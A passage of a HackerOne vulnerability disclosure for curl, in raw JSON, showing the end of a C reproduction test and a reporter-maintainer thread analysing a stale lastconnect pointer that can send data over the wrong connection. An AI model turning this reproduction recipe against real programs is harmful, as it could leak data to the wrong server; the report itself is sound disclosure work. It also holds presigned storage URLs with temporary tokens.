class=\"n\"\u003emulti\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026amp;\u003c/span\u003e\u003cspan class=\"n\"\u003eremaining\u003c/span\u003e\u003cspan class=\"p\"\u003e))\u003c/span\u003e\n        \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n            \u003cspan class=\"n\"\u003erequire\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003einfo\u003c/span\u003e\u003cspan class=\"o\"\u003e-\u0026gt;\u003c/span\u003e\u003cspan class=\"n\"\u003emsg\u003c/span\u003e \u003cspan class=\"o\"\u003e==\u003c/span\u003e \u003cspan class=\"n\"\u003eCURLMSG_DONE\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n            \u003cspan class=\"n\"\u003erequire\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003einfo\u003c/span\u003e\u003cspan class=\"o\"\u003e-\u0026gt;\u003c/span\u003e\u003cspan class=\"n\"\u003eeasy_handle\u003c/span\u003e \u003cspan class=\"o\"\u003e==\u003c/span\u003e \u003cspan class=\"n\"\u003eeasy1236\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n            \u003cspan class=\"n\"\u003erequire\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003einfo\u003c/span\u003e\u003cspan class=\"o\"\u003e-\u0026gt;\u003c/span\u003e\u003cspan class=\"n\"\u003edata\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eresult\u003c/span\u003e \u003cspan class=\"o\"\u003e==\u003c/span\u003e \u003cspan class=\"n\"\u003eCURLE_OK\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n            \u003cspan class=\"k\"\u003ebreak\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n        \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n    \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\n    \u003cspan class=\"kt\"\u003echar\u003c/span\u003e \u003cspan class=\"n\"\u003ec\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"sc\"\u003e\u0026#39;a\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n    \u003cspan class=\"kt\"\u003esize_t\u003c/span\u003e \u003cspan class=\"n\"\u003en\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n    \u003cspan class=\"c1\"\u003e// Attempts to send data to port 1234, but actually uses the connection to port 1236\u003c/span\u003e\n    \u003cspan class=\"n\"\u003eeret\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003ecurl_easy_send\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eeasy1234\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026amp;\u003c/span\u003e\u003cspan class=\"n\"\u003ec\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026amp;\u003c/span\u003e\u003cspan class=\"n\"\u003en\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n    \u003cspan class=\"n\"\u003erequire\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eeret\u003c/span\u003e \u003cspan class=\"o\"\u003e==\u003c/span\u003e \u003cspan class=\"n\"\u003eCURLE_OK\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\n    \u003cspan class=\"n\"\u003emret\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003ecurl_multi_remove_handle\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003emulti\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003eeasy1236\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n    \u003cspan class=\"n\"\u003erequire\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003emret\u003c/span\u003e \u003cspan class=\"o\"\u003e==\u003c/span\u003e \u003cspan class=\"n\"\u003eCURLM_OK\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n    \u003cspan class=\"n\"\u003emret\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003ecurl_multi_remove_handle\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003emulti\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003eeasy1235\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n    \u003cspan class=\"n\"\u003erequire\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003emret\u003c/span\u003e \u003cspan class=\"o\"\u003e==\u003c/span\u003e \u003cspan class=\"n\"\u003eCURLM_OK\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n    \u003cspan class=\"n\"\u003emret\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003ecurl_multi_remove_handle\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003emulti\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003eeasy1234\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n    \u003cspan class=\"n\"\u003erequire\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003emret\u003c/span\u003e \u003cspan class=\"o\"\u003e==\u003c/span\u003e \u003cspan class=\"n\"\u003eCURLM_OK\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n    \u003cspan class=\"n\"\u003emret\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003ecurl_multi_cleanup\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003emulti\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n    \u003cspan class=\"n\"\u003erequire\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003emret\u003c/span\u003e \u003cspan class=\"o\"\u003e==\u003c/span\u003e \u003cspan class=\"n\"\u003eCURLM_OK\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch2 id=\"impact\"\u003eImpact\u003c/h2\u003e\n\n\u003cp\u003eThis could cause sensitive data intended for one server to be transmitted to a different server.\u003c/p\u003e\n","bounty_amount":"500.0","formatted_bounty":"$500","weakness":{"id":18,"name":"Information Disclosure"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2020-12-05T08:31:12.531Z","allow_singular_disclosure_after":-2068939.697567051,"singular_disclosure_allowed":true,"vote_count":11,"voters":["pat_ventuzelo","mygf","powerjacobb1","realtess","exploit_db","aliasad1010","smarty242","mutza974","papa_sm1rf","hhdl","and 1 more..."],"severity":{"rating":"low","author_type":"User"},"structured_scope":{"databaseId":18844,"asset_type":"SOURCE_CODE","asset_identifier":"https://github.com/curl/curl","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":8819963,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks for your report, we will look into it!","markdown_message":"\u003cp\u003eThanks for your report, we will look into it!\u003c/p\u003e\n","automated_response":false,"created_at":"2020-07-31T22:51:59.659Z","updated_at":"2020-07-31T22:51:59.659Z","actor":{"username":"bagder","cleared":false,"url":"/bagder","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/459/380/963f64725677dda4f5113219588e7d0c1ab9abaa_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"curl","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8822150,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Is the `curl_global_init_mem` needed for this problem to appear? Does the problem not appear if we just use `curl_global_init` and uses the default memory functions?","markdown_message":"\u003cp\u003eIs the \u003ccode\u003ecurl_global_init_mem\u003c/code\u003e needed for this problem to appear? Does the problem not appear if we just use \u003ccode\u003ecurl_global_init\u003c/code\u003e and uses the default memory functions?\u003c/p\u003e\n","automated_response":false,"created_at":"2020-08-01T08:58:02.940Z","updated_at":"2020-08-01T08:58:02.940Z","actor":{"username":"bagder","cleared":false,"url":"/bagder","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/459/380/963f64725677dda4f5113219588e7d0c1ab9abaa_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"curl","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8824362,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"The problem can happen with any memory allocator that reuses freed memory.  The custom allocator causes it to happen deterministically with this test case, but it should be possible to create a test case tailored to any specific memory allocator if you know its memory re-use strategy.","markdown_message":"\u003cp\u003eThe problem can happen with any memory allocator that reuses freed memory.  The custom allocator causes it to happen deterministically with this test case, but it should be possible to create a test case tailored to any specific memory allocator if you know its memory re-use strategy.\u003c/p\u003e\n","automated_response":false,"created_at":"2020-08-01T15:24:31.285Z","updated_at":"2020-08-01T15:24:31.285Z","actor":{"username":"m42a","cleared":false,"url":"/m42a","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"curl","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8824482,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Sorry, but if the problem relies on your provided functions, isn't this then just proving that the problem is related to those functions and not necessarily in curl itself?\n\nI have not tried to proof-read your code but for example your calloc() seems broken (it doesn't always return cleared memory), which then hardly is curl's fault.","markdown_message":"\u003cp\u003eSorry, but if the problem relies on your provided functions, isn\u0026#39;t this then just proving that the problem is related to those functions and not necessarily in curl itself?\u003c/p\u003e\n\n\u003cp\u003eI have not tried to proof-read your code but for example your calloc() seems broken (it doesn\u0026#39;t always return cleared memory), which then hardly is curl\u0026#39;s fault.\u003c/p\u003e\n","automated_response":false,"created_at":"2020-08-01T15:47:57.256Z","updated_at":"2020-08-01T15:48:16.718Z","actor":{"username":"bagder","cleared":false,"url":"/bagder","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/459/380/963f64725677dda4f5113219588e7d0c1ab9abaa_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"curl","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8824543,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I have attached a program that reproduces the issue (on my system) without intercepting the allocation functions.  Note that this relies on the system allocator, and thus may fail to reproduce for you.  I'm running Arch Linux, using the system libraries, and compiling with GCC 10.1.0 with no additional compiler flags.","markdown_message":"\u003cp\u003eI have attached a program that reproduces the issue (on my system) without intercepting the allocation functions.  Note that this relies on the system allocator, and thus may fail to reproduce for you.  I\u0026#39;m running Arch Linux, using the system libraries, and compiling with GCC 10.1.0 with no additional compiler flags.\u003c/p\u003e\n","automated_response":false,"created_at":"2020-08-01T16:08:15.363Z","updated_at":"2020-08-01T16:08:15.363Z","actor":{"username":"m42a","cleared":false,"url":"/m42a","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"attachments":[{"id":932910,"filename":"curl-malloc.cpp","type":"text/x-c++src","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/XJR9RcgtoNBJTGGC3M3yhipz?response-content-disposition=attachment%3B%20filename%3D%22curl-malloc.cpp%22%3B%20filename%2A%3DUTF-8%27%27curl-malloc.cpp\u0026response-content-type=text%2Fx-c%2B%2Bsrc\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQS4MXLS4F%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T071332Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCdPyDr833HeXJwYpWjpt%2BE8j%2FssC2h5%2FlaE7mZngOMiQIhAIhVLq5AR6H%2BIAtKS0YClrr2gxSJzGl8%2FZmOeT68dbjNKrQDCFYQARoMMDEzNjE5Mjc0ODQ5IgyLw4q7eiVATMCuJ5oqkQNRnoM2%2F7QfXwU%2Fz3OKzDhPBavarq1CsKnppYIDxpxowNYh40iJGbW36kruwk7Up1vRvNyltjF5q8qwhzaGeQZ%2BiAxZXfxuO%2B2Kcrl44J%2BblDlgfJxT%2FhANHqEJ52YkeCqL%2F8Jog8rViNOOl6oETOov%2FmlWe%2BSn52SY6oPYBRdYu%2BBKeiMV8Z7HXhpAE7juI1J25wS6dso8QH7RSAhNGIs8Y8svP20AF0GCUvT57CvEpTEKNmlMu6qBfLwB6pdnFPVBhYyN%2FfIE4%2FQa2wOG4EtJYFQfTQjLwttTt9CYHJbPWKgJsiqZWwvzgG5RucysYaY1Dvc5h%2B9x16jomi9UPmmxblIqy%2BUz9R8kd2FgetX%2B5J5YRu%2FIt1eM4Pmo0vWG1EERVUZkvMX57A4jS5kp%2F0ojOEF2BB5VpPswd3ts8BMSrW%2BwRyh9hJwmvOT24d%2FVDV1XlH12OfiqXYDHqfINlxhQS6ahBnjyeup6YaEdMK6oUB8ZRQCgIyT6ugHXy7R98squWf9jBVCuea8OVuecORCfgjCE76r%2FBTrqAVa%2BDcEKB0%2FoTap54OIKsextuoDcyV%2B5vaIZrhq52EXThW%2BXIbAp6mSkhzoWUgjsywl0H1o%2FDaG%2BNn3BBVN%2BRn45Quca4CUlobnDZ4s%2FQCgf9Z7bonFsVRNiD0YQAXIATjx%2FHm9NSP5TZgVxAil%2FiJbzMr5CzCPucZqQZHGinQXPFIlAHaN7P8LEs1k%2BYLHWhoCxufAjr4F07sxUlcZob%2BG%2FmA%2B1KCCNdIEo%2B%2BJY954m5YuWhqgrGS3SilW7Zv%2FcvslV9aFtJ6DgZI3AgcMDa3advxrZKKcSBi8tFdkDhjvGZZWiwX118rNoAQ%3D%3D\u0026X-Amz-Signature=cf7250d0b4e6391b6dce9eb2c09b39246f1e47cef6613648fc3b947892ba20c7"}],"genius_execution_id":null,"team_handle":"curl","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8824560,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"so the problem is somehow a UAF (Use After Free) ?","markdown_message":"\u003cp\u003eso the problem is somehow a UAF (Use After Free) ?\u003c/p\u003e\n","automated_response":false,"created_at":"2020-08-01T16:12:01.845Z","updated_at":"2020-08-01T16:12:01.845Z","actor":{"username":"bagder","cleared":false,"url":"/bagder","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/459/380/963f64725677dda4f5113219588e7d0c1ab9abaa_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"curl","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8824623,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Kind of.  It's a single-threaded variant of an [ABA problem](https://en.wikipedia.org/wiki/ABA_problem) where the easy handle identifies a connection by memory address and just assumes that any connection at that address is the original connection.  So if the memory was just freed it would simply fail to find the connection, but the fact that a second connection was allocated at the address that the first connection used to be causes it to think that it has a connection when in fact that connection is unrelated.","markdown_message":"\u003cp\u003eKind of.  It\u0026#39;s a single-threaded variant of an \u003ca href=\"/redirect?url=https%3A%2F%2Fen.wikipedia.org%2Fwiki%2FABA_problem\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eABA problem\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e where the easy handle identifies a connection by memory address and just assumes that any connection at that address is the original connection.  So if the memory was just freed it would simply fail to find the connection, but the fact that a second connection was allocated at the address that the first connection used to be causes it to think that it has a connection when in fact that connection is unrelated.\u003c/p\u003e\n","automated_response":false,"created_at":"2020-08-01T16:29:23.111Z","updated_at":"2020-08-01T16:29:23.111Z","actor":{"username":"m42a","cleared":false,"url":"/m42a","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"curl","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8824644,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"What libcurl version are you using when you see the problem?\n\nI tested both git master and 7.71.1 just now and `require()` on line 124 triggers (see below). I use glibc 2.31 and g++ 10.2.0 on debian unstable.\n\n~~~c\n// Attempts to send data to port 1234, but actually uses the connection to port 1236\neret = curl_easy_send(easy1234, \u0026c, 1, \u0026n);\nrequire(eret == CURLE_OK); \u003c= this one\n~~~","markdown_message":"\u003cp\u003eWhat libcurl version are you using when you see the problem?\u003c/p\u003e\n\n\u003cp\u003eI tested both git master and 7.71.1 just now and \u003ccode\u003erequire()\u003c/code\u003e on line 124 triggers (see below). I use glibc 2.31 and g++ 10.2.0 on debian unstable.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight c\"\u003e\u003ccode\u003e\u003cspan class=\"c1\"\u003e// Attempts to send data to port 1234, but actually uses the connection to port 1236\u003c/span\u003e\n\u003cspan class=\"n\"\u003eeret\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003ecurl_easy_send\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eeasy1234\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026amp;\u003c/span\u003e\u003cspan class=\"n\"\u003ec\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026amp;\u003c/span\u003e\u003cspan class=\"n\"\u003en\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003cspan class=\"n\"\u003erequire\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eeret\u003c/span\u003e \u003cspan class=\"o\"\u003e==\u003c/span\u003e \u003cspan class=\"n\"\u003eCURLE_OK\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026lt;=\u003c/span\u003e \u003cspan class=\"n\"\u003ethis\u003c/span\u003e \u003cspan class=\"n\"\u003eone\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","automated_response":false,"created_at":"2020-08-01T16:34:32.951Z","updated_at":"2020-08-01T16:34:32.951Z","actor":{"username":"bagder","cleared":false,"url":"/bagder","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/459/380/963f64725677dda4f5113219588e7d0c1ab9abaa_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"curl","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8824657,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I'm also using glibc 2.31 and curl 7.71.1.","markdown_message":"\u003cp\u003eI\u0026#39;m also using glibc 2.31 and curl 7.71.1.\u003c/p\u003e\n","automated_response":false,"created_at":"2020-08-01T16:39:43.959Z","updated_at":"2020-08-01T16:39:43.959Z","actor":{"username":"m42a","cleared":false,"url":"/m42a","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"curl","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8824799,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Here is a program that uses a separate jemalloc arena for curl; you may find it easier to reproduce with this.  I'm using jemalloc 5.2.1.","markdown_message":"\u003cp\u003eHere is a program that uses a separate jemalloc arena for curl; you may find it easier to reproduce with this.  I\u0026#39;m using jemalloc 5.2.1.\u003c/p\u003e\n","automated_response":false,"created_at":"2020-08-01T17:08:36.029Z","updated_at":"2020-08-01T17:08:36.029Z","actor":{"username":"m42a","cleared":false,"url":"/m42a","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"attachments":[{"id":932957,"filename":"curl-malloc.cpp","type":"text/x-c++src","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/TSyRRLKcsrPZJ1DkAcjMAgJT?response-content-disposition=attachment%3B%20filename%3D%22curl-malloc.cpp%22%3B%20filename%2A%3DUTF-8%27%27curl-malloc.cpp\u0026response-content-type=text%2Fx-c%2B%2Bsrc\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQS4MXLS4F%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T071332Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCdPyDr833HeXJwYpWjpt%2BE8j%2FssC2h5%2FlaE7mZngOMiQIhAIhVLq5AR6H%2BIAtKS0YClrr2gxSJzGl8%2FZmOeT68dbjNKrQDCFYQARoMMDEzNjE5Mjc0ODQ5IgyLw4q7eiVATMCuJ5oqkQNRnoM2%2F7QfXwU%2Fz3OKzDhPBavarq1CsKnppYIDxpxowNYh40iJGbW36kruwk7Up1vRvNyltjF5q8qwhzaGeQZ%2BiAxZXfxuO%2B2Kcrl44J%2BblDlgfJxT%2FhANHqEJ52YkeCqL%2F8Jog8rViNOOl6oETOov%2FmlWe%2BSn52SY6oPYBRdYu%2BBKeiMV8Z7HXhpAE7juI1J25wS6dso8QH7RSAhNGIs8Y8svP20AF0GCUvT57CvEpTEKNmlMu6qBfLwB6pdnFPVBhYyN%2FfIE4%2FQa2wOG4EtJYFQfTQjLwttTt9CYHJbPWKgJsiqZWwvzgG5RucysYaY1Dvc5h%2B9x16jomi9UPmmxblIqy%2BUz9R8kd2FgetX%2B5J5YRu%2FIt1eM4Pmo0vWG1EERVUZkvMX57A4jS5kp%2F0ojOEF2BB5VpPswd3ts8BMSrW%2BwRyh9hJwmvOT24d%2FVDV1XlH12OfiqXYDHqfINlxhQS6ahBnjyeup6YaEdMK6oUB8ZRQCgIyT6ugHXy7R98squWf9jBVCuea8OVuecORCfgjCE76r%2FBTrqAVa%2BDcEKB0%2FoTap54OIKsextuoDcyV%2B5vaIZrhq52EXThW%2BXIbAp6mSkhzoWUgjsywl0H1o%2FDaG%2BNn3BBVN%2BRn45Quca4CUlobnDZ4s%2FQCgf9Z7bonFsVRNiD0YQAXIATjx%2FHm9NSP5TZgVxAil%2FiJbzMr5CzCPucZqQZHGinQXPFIlAHaN7P8LEs1k%2BYLHWhoCxufAjr4F07sxUlcZob%2BG%2FmA%2B1KCCNdIEo%2B%2BJY954m5YuWhqgrGS3SilW7Zv%2FcvslV9aFtJ6DgZI3AgcMDa3advxrZKKcSBi8tFdkDhjvGZZWiwX118rNoAQ%3D%3D\u0026X-Amz-Signature=7d90211f5848908a58469332115feec25b9ae21d78d668dec9bb0e79776b5949"}],"genius_execution_id":null,"team_handle":"curl","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8826012,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Ah yes. Thanks for  providing the different versions, they're very helpful. The jemalloc recipe does indeed reproduce the problem for me.\n\n# The issue\n\nThe problem is that when `data-\u003estate.lastconnect` is set to point to a connectdata struct, the pointer is not updated if a connection is removed. Then the pointed-to connection might be removed and if then a new connection is created before the pointer is used (and it gets allocated on the same memory address), the `lastconnect` pointer can end up pointing to the next connection instead of the original one.\n\n# Limitations\n\nI believe this flaw is limited to affecting curl_easy_send/curl_easy_recv and CURLINFO_LASTSOCKET/CURLINFO_ACTIVESOCKET, not any of the transfer APIs.\n\n# Security issue?\n\nIt's a very limited bug that is triggered in rare circumstances that really need the planets to be properly aligned, but then that's probably also why this can become a real security issue: a program can be written to use those functions and never see the problem happen until way later in a situation that could be problematic.\n\nI'll take another round of thinking, and I hope other security team members do as well, but I think it smells like a security problem.","markdown_message":"\u003cp\u003eAh yes. Thanks for  providing the different versions, they\u0026#39;re very helpful. The jemalloc recipe does indeed reproduce the problem for me.\u003c/p\u003e\n\n\u003ch1 id=\"the-issue\"\u003eThe issue\u003c/h1\u003e\n\n\u003cp\u003eThe problem is that when \u003ccode\u003edata-\u0026gt;state.lastconnect\u003c/code\u003e is set to point to a connectdata struct, the pointer is not updated if a connection is removed. Then the pointed-to connection might be removed and if then a new connection is created before the pointer is used (and it gets allocated on the same memory address), the \u003ccode\u003elastconnect\u003c/code\u003e pointer can end up pointing to the next connection instead of the original one.\u003c/p\u003e\n\n\u003ch1 id=\"limitations\"\u003eLimitations\u003c/h1\u003e\n\n\u003cp\u003eI believe this flaw is limited to affecting curl_easy_send/curl_easy_recv and CURLINFO_LASTSOCKET/CURLINFO_ACTIVESOCKET, not any of the transfer APIs.\u003c/p\u003e\n\n\u003ch1 id=\"security-issue\"\u003eSecurity issue?\u003c/h1\u003e\n\n\u003cp\u003eIt\u0026#39;s a very limited bug that is triggered in rare circumstances that really need the planets to be properly aligned, but then that\u0026#39;s probably also why this can become a real security issue: a program can be written to use those functions and never see the problem happen until way later in a situation that could be problematic.\u003c/p\u003e\n\n\u003cp\u003eI\u0026#39;ll take another round of thinking, and I hope other security team members do as well, but I think it smells like a security problem.\u003c/p\u003e\n","automated_response":false,"created_at":"2020-08-01T22:30:41.167Z","updated_at":"2020-08-01T22:30:41.167Z","actor":{"username":"bagder","cleared":false,"url":"/bagder","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/459/380/963f64725677dda4f5113219588e7d0c1ab9abaa_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"curl","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8832038,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@m42a: while we look deeper at this, do you have a fix or intend to work on one?","markdown_message":"\u003cp\u003e\u003ca href=\"/m42a\"\u003e@m42a\u003c/a\u003e: while we look deeper at this, do you have a fix or intend to work on one?\u003c/p\u003e\n","automated_response":false,"created_at":"2020-08-03T08:23:34.084Z","updated_at":"2020-08-03T08:23:34.084Z","actor":{"username":"bagder","cleared":false,"url":"/bagder","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/459/380/963f64725677dda4f5113219588e7d0c1ab9abaa_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"curl","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8834795,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"It struck me we should rather change the logic to use the `connection_id` to find the connection with instead, as that's an increasing number for every new connection... I'm trying out a patch locally now.","markdown_message":"\u003cp\u003eIt struck me we should rather change the logic to use the \u003ccode\u003econnection_id\u003c/code\u003e to find the connection with instead, as that\u0026#39;s an increasing number for every new connection... I\u0026#39;m trying out a patch locally 